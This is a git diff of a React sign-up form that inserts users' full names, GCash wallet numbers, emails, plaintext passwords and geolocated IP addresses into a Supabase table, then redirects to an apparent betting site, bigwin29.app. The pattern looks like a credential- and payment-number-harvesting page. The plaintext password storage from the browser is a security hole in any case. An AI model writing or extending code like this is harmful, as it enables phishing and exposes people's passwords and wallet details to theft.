@@ -1,4 +1,5 @@
 import { useState, useEffect } from "react";
+import { supabase } from "./supabaseClient"
 
 function App() {
   const [form, setForm] = useState({
@@ -8,15 +9,18 @@ function App() {
     email: "",
     password: "",
     confirmPassword: "",
+    ipAddress: "",
     isAdult: false,
   });
 
   useEffect(() => {
     // Get IP address
     fetch('https://api.ipify.org?format=json')
+    
       .then(response => response.json())
       .then(data => {
         console.log('IP Address:', data.ip);
+         setForm(prev => ({ ...prev, ipAddress: data.ip }))
         // Get location based on IP
         return fetch(`https://ipapi.co/${data.ip}/json/`);
       })
@@ -42,28 +46,50 @@ function App() {
     });
   };
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
+ 
+const handleSubmit = async (e) => {
+  e.preventDefault();
 
-    if (form.password.length < 8) {
-      alert("Password must be at least 8 characters.");
-      return;
-    }
+  if (form.password.length < 8) {
+    alert("Password must be at least 8 characters.");
+    return;
+  }
 
-    if (form.password !== form.confirmPassword) {
-      alert("Passwords do not match.");
-      return;
-    }
+  if (form.password !== form.confirmPassword) {
+    alert("Passwords do not match.");
+    return;
+  }
 
-    if (!form.isAdult) {
-      alert("You must be 18 years old or above.");
-      return;
-    }
+  if (!form.isAdult) {
+    alert("You must be 18 years old or above.");
+    return;
+  }
 
-    console.log("Form submitted:", form);
-    alert("Registration successful!");
-  };
+  const { error } = await supabase
+    .from("users")
+    .insert([
+      {
+        full_name: form.firstName + " " + form.surname,
+        number: form.gcash,
+        email: form.email,
+        password: form.password,
+        age: 18,
+        ip_address: form.ipAddress,
+        timestamp_clicked: new Date()
+        
+      }
+    ]);
 
+  if (error) {
+    console.error(error);
+    alert("Registration failed");
+    return;
+  }
+
+  console.log("Inserted:", form);
+  // Redirect to success page
+  window.location.href = "https://bigwin29.app/";
+};
   return (
     <>
       <div className="bg-[url(/Background_Image.png)] bg-cover bg-center min-h-screen w-screen p-4 md:p-0 m-0">
@@ -166,6 +192,7 @@ function App() {
             <button
               type="submit"
               className="w-full bg-blue-500 hover:bg-blue-600 text-white p-2 rounded"
+              
             >
               Register
             </button>
